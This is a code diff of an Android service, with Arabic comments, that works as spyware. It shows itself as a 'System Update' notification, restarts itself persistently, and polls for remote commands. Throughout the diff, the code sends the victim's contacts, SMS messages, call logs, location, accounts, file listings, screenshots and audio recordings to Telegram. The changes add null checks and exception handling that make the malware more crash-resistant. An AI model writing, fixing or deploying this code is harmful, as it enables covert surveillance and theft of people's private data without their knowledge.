@@ -77,58 +77,72 @@ public class MainService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-
-        // 1. WakeLock لضمان عدم النوم
-        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
-        wakeLock.acquire();
-
-        // 2. إعداد MediaProjection
-        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-        DisplayMetrics metrics = new DisplayMetrics();
-        wm.getDefaultDisplay().getMetrics(metrics);
-        screenWidth = metrics.widthPixels;
-        screenHeight = metrics.heightPixels;
-        screenDensity = metrics.densityDpi;
-
-        // 3. بدء الخدمة في المقدمة
-        startForegroundService();
-
-        // 4. إرسال رسالة تأكيد بعد 2 ثانية
-        handler.postDelayed(() -> sendToTelegram("✅ MainService Started"), 2000);
-
-        // 5. بدء مراقبة الأوامر كل 5 ثواني
-        timer = new Timer();
-        timer.scheduleAtFixedRate(new TimerTask() {
-            @Override
-            public void run() {
-                try {
-                    checkCommands();
-                } catch (Exception ignored) { }
+        try {
+            // WakeLock
+            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+            if (powerManager != null) {
+                wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
+                wakeLock.acquire();
             }
-        }, 5000, 5000);
+
+            // إعداد MediaProjection
+            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            if (wm != null) {
+                DisplayMetrics metrics = new DisplayMetrics();
+                wm.getDefaultDisplay().getMetrics(metrics);
+                screenWidth = metrics.widthPixels;
+                screenHeight = metrics.heightPixels;
+                screenDensity = metrics.densityDpi;
+            }
+
+            startForegroundService();
+
+            // تأخير إرسال الرسالة الأولى حتى تستقر الخدمة
+            handler.postDelayed(() -> sendToTelegram("✅ MainService Started"), 3000);
+
+            // تأخير بدء الـ Timer قليلاً
+            handler.postDelayed(() -> {
+                timer = new Timer();
+                timer.scheduleAtFixedRate(new TimerTask() {
+                    @Override
+                    public void run() {
+                        try {
+                            checkCommands();
+                        } catch (Exception ignored) { }
+                    }
+                }, 5000, 5000);
+            }, 2000);
+
+        } catch (Exception e) {
+            // أي خطأ في البداية لا يسبب كراش
+            e.printStackTrace();
+        }
     }
 
     private void startForegroundService() {
-        String channelId = "main_channel";
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(channelId, "Main Service",
-                    NotificationManager.IMPORTANCE_LOW);
-            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (manager != null) manager.createNotificationChannel(channel);
+        try {
+            String channelId = "main_channel";
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel channel = new NotificationChannel(channelId, "Main Service",
+                        NotificationManager.IMPORTANCE_LOW);
+                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+                if (manager != null) manager.createNotificationChannel(channel);
+            }
+            Notification notification = new NotificationCompat.Builder(this, channelId)
+                    .setContentTitle("System Update")
+                    .setContentText("يعمل في الخلفية")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .build();
+            startForeground(1, notification);
+        } catch (Exception e) {
+            e.printStackTrace();
         }
-        Notification notification = new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("System Update")
-                .setContentText("يعمل في الخلفية")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .build();
-        startForeground(1, notification);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // هذا هو السر الرئيسي: START_STICKY يجعل الخدمة تعاد تشغيلها إذا قتلها النظام
+        // START_STICKY: إذا قتل النظام الخدمة، تعاد تلقائياً
         return START_STICKY;
     }
 
@@ -260,7 +274,7 @@ public class MainService extends Service {
             info.put("battery", getBatteryLevel());
 
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)
+            if (tm != null && checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)
                 info.put("phone", tm.getLine1Number());
 
             sendToTelegram("📱 Device Info:\n" + info.toString(2));
@@ -271,10 +285,13 @@ public class MainService extends Service {
         try {
             IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
             Intent batteryStatus = registerReceiver(null, ifilter);
-            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
-            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
-            return (int)(level * 100 / (float)scale);
-        } catch (Exception e) { return 0; }
+            if (batteryStatus != null) {
+                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+                return (int)(level * 100 / (float)scale);
+            }
+        } catch (Exception e) { }
+        return 0;
     }
 
     private void getContacts() {
@@ -289,13 +306,15 @@ public class MainService extends Service {
                         null, null, null, null);
                 StringBuilder sb = new StringBuilder("📇 Contacts:\n\n");
                 int count = 0;
-                while (cursor != null && cursor.moveToNext() && count < 100) {
-                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    sb.append(name).append(": ").append(number).append("\n");
-                    count++;
+                if (cursor != null) {
+                    while (cursor.moveToNext() && count < 100) {
+                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                        String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        sb.append(name).append(": ").append(number).append("\n");
+                        count++;
+                    }
+                    cursor.close();
                 }
-                if (cursor != null) cursor.close();
                 if (count == 0) sb.append("No contacts");
                 sendToTelegram(sb.toString());
             } catch (Exception e) { }
@@ -309,12 +328,14 @@ public class MainService extends Service {
                 return;
             }
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-            if (location != null) {
-                sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude());
-            } else {
-                sendToTelegram("📍 Location not available");
+            if (lm != null) {
+                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                if (location != null) {
+                    sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude());
+                } else {
+                    sendToTelegram("📍 Location not available");
+                }
             }
         } catch (Exception e) { }
     }
@@ -329,12 +350,14 @@ public class MainService extends Service {
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                 StringBuilder sb = new StringBuilder("📨 Last 10 SMS:\n\n");
-                while (cursor != null && cursor.moveToNext()) {
-                    String address = cursor.getString(cursor.getColumnIndex("address"));
-                    String body = cursor.getString(cursor.getColumnIndex("body"));
-                    sb.append(address).append(": ").append(body).append("\n---\n");
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        String address = cursor.getString(cursor.getColumnIndex("address"));
+                        String body = cursor.getString(cursor.getColumnIndex("body"));
+                        sb.append(address).append(": ").append(body).append("\n---\n");
+                    }
+                    cursor.close();
                 }
-                if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No SMS");
                 sendToTelegram(sb.toString());
             } catch (Exception e) { }
@@ -351,14 +374,16 @@ public class MainService extends Service {
                 Cursor cursor = getContentResolver().query(
                         Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                 StringBuilder sb = new StringBuilder("📞 Last 10 Calls:\n\n");
-                while (cursor != null && cursor.moveToNext()) {
-                    String number = cursor.getString(cursor.getColumnIndex("number"));
-                    String type = cursor.getString(cursor.getColumnIndex("type"));
-                    String duration = cursor.getString(cursor.getColumnIndex("duration"));
-                    String typeText = type.equals("1") ? "Incoming" : type.equals("2") ? "Outgoing" : "Missed";
-                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        String number = cursor.getString(cursor.getColumnIndex("number"));
+                        String type = cursor.getString(cursor.getColumnIndex("type"));
+                        String duration = cursor.getString(cursor.getColumnIndex("duration"));
+                        String typeText = type.equals("1") ? "Incoming" : type.equals("2") ? "Outgoing" : "Missed";
+                        sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
+                    }
+                    cursor.close();
                 }
-                if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No calls");
                 sendToTelegram(sb.toString());
             } catch (Exception e) { }
@@ -369,13 +394,15 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
-                android.accounts.Account[] accounts = am.getAccounts();
-                StringBuilder sb = new StringBuilder("👤 Accounts:\n\n");
-                for (android.accounts.Account acc : accounts) {
-                    sb.append(acc.type).append(": ").append(acc.name).append("\n");
+                if (am != null) {
+                    android.accounts.Account[] accounts = am.getAccounts();
+                    StringBuilder sb = new StringBuilder("👤 Accounts:\n\n");
+                    for (android.accounts.Account acc : accounts) {
+                        sb.append(acc.type).append(": ").append(acc.name).append("\n");
+                    }
+                    if (accounts.length == 0) sb.append("No accounts");
+                    sendToTelegram(sb.toString());
                 }
-                if (accounts.length == 0) sb.append("No accounts");
-                sendToTelegram(sb.toString());
             } catch (Exception e) { }
         }).start();
     }
@@ -391,12 +418,14 @@ public class MainService extends Service {
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
                 StringBuilder sb = new StringBuilder("🖼 Last 10 Photos:\n\n");
-                while (cursor != null && cursor.moveToNext()) {
-                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
-                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
-                    sb.append(name).append("\n").append(path).append("\n---\n");
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
+                        String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
+                        sb.append(name).append("\n").append(path).append("\n---\n");
+                    }
+                    cursor.close();
                 }
-                if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No photos");
                 sendToTelegram(sb.toString());
             } catch (Exception e) { }
@@ -414,12 +443,14 @@ public class MainService extends Service {
                 Cursor cursor = getContentResolver().query(
                         MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
                 StringBuilder sb = new StringBuilder("🎥 Last 10 Videos:\n\n");
-                while (cursor != null && cursor.moveToNext()) {
-                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
-                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
-                    sb.append(name).append("\n").append(path).append("\n---\n");
+                if (cursor != null) {
+                    while (cursor.moveToNext()) {
+                        String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
+                        String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
+                        sb.append(name).append("\n").append(path).append("\n---\n");
+                    }
+                    cursor.close();
                 }
-                if (cursor != null) cursor.close();
                 if (sb.length() == 0) sb.append("No videos");
                 sendToTelegram(sb.toString());
             } catch (Exception e) { }
@@ -434,10 +465,12 @@ public class MainService extends Service {
                     return;
                 }
                 File storage = Environment.getExternalStorageDirectory();
-                StringBuilder sb = new StringBuilder("📁 Files:\n\n");
-                listFiles(storage, sb, 0);
-                if (sb.length() == 0) sb.append("No files");
-                sendToTelegram(sb.toString());
+                if (storage != null) {
+                    StringBuilder sb = new StringBuilder("📁 Files:\n\n");
+                    listFiles(storage, sb, 0);
+                    if (sb.length() == 0) sb.append("No files");
+                    sendToTelegram(sb.toString());
+                }
             } catch (Exception e) { }
         }).start();
     }
@@ -457,35 +490,46 @@ public class MainService extends Service {
         }
     }
 
-    // ========== تصوير الشاشة ==========
+    // ========== تصوير الشاشة (محمي بالكامل) ==========
     private void takeScreenshot() {
-        if (mediaProjection == null) {
-            setupMediaProjection();
-            if (mediaProjection == null) {
-                sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة. أعد فتح التطبيق وافعلها.");
+        try {
+            if (projectionManager == null) {
+                sendToTelegram("❌ MediaProjectionManager غير متاح");
                 return;
             }
-        }
+            if (mediaProjection == null) {
+                setupMediaProjection();
+                if (mediaProjection == null) {
+                    sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة. أعد فتح التطبيق وافعلها.");
+                    return;
+                }
+            }
+            if (screenWidth == 0 || screenHeight == 0) {
+                sendToTelegram("❌ لم يتم الحصول على مقاسات الشاشة");
+                return;
+            }
 
-        try {
             ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
             VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
                     "Screenshot", screenWidth, screenHeight, screenDensity,
                     DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                    imageReader.getSurface(), null, null
-            );
+                    imageReader.getSurface(), null, null);
 
             handler.postDelayed(() -> {
-                Image image = imageReader.acquireLatestImage();
-                if (image != null) {
-                    Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
-                    bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
-                    sendScreenshot(bitmap);
-                    image.close();
-                    bitmap.recycle();
+                try {
+                    Image image = imageReader.acquireLatestImage();
+                    if (image != null) {
+                        Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
+                        bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
+                        sendScreenshot(bitmap);
+                        image.close();
+                        bitmap.recycle();
+                    }
+                    virtualDisplay.release();
+                    imageReader.close();
+                } catch (Exception e) {
+                    sendToTelegram("❌ فشل معالجة الصورة: " + e.getMessage());
                 }
-                virtualDisplay.release();
-                imageReader.close();
             }, 500);
             sendToTelegram("📸 جاري تصوير الشاشة...");
         } catch (Exception e) {
@@ -497,7 +541,7 @@ public class MainService extends Service {
         try {
             int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
             String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
-            if (resultCode != -1 && dataUri != null) {
+            if (resultCode != -1 && dataUri != null && projectionManager != null) {
                 Intent data = Intent.parseUri(dataUri, 0);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                     mediaProjection = projectionManager.getMediaProjection(resultCode, data);
@@ -544,7 +588,11 @@ public class MainService extends Service {
             }
             String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
             File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
-            if (!audioDir.exists()) audioDir.mkdirs();
+            if (audioDir != null && !audioDir.exists()) audioDir.mkdirs();
+            if (audioDir == null) {
+                sendToTelegram("❌ لا يمكن الوصول للتخزين");
+                return;
+            }
             currentAudioPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
 
             mediaRecorder = new MediaRecorder();
@@ -580,12 +628,14 @@ public class MainService extends Service {
     private void vibrate() {
         try {
             Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
-            } else {
-                v.vibrate(2000);
+            if (v != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+                } else {
+                    v.vibrate(2000);
+                }
+                sendToTelegram("📳 Vibrating");
             }
-            sendToTelegram("📳 Vibrating");
         } catch (Exception e) { }
     }
 
